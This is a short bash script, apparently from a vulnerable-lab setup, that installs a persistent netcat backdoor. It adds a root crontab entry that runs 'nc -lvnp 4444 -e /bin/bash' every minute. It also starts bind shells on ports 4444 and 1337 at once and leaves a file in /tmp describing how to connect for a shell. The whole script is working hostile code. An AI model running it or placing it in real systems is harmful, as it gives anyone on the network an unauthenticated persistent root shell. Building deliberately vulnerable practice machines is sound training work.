#!/bin/bash
# vuln: netcat_backdoor | severity: critical
echo "[VULN] Installing Netcat Backdoor..."
# Add persistent backdoor via cron
echo "* * * * * root nohup nc -lvnp 4444 -e /bin/bash > /dev/null 2>&1 &" >> /etc/crontab
# Start immediately
nohup nc -lvnp 4444 -e /bin/bash > /dev/null 2>&1 &
nohup nc -lvnp 1337 -e /bin/bash > /dev/null 2>&1 &
cat > /tmp/backdoor_info.txt << 'EOFTXT'
BACKDOOR INSTALLED
==================
Port 4444: nc <IP> 4444 (gives shell)
Port 1337: nc <IP> 1337 (gives shell)
Persistent via /etc/crontab
EOFTXT
echo "[VULN] Netcat backdoor on ports 4444 and 1337."
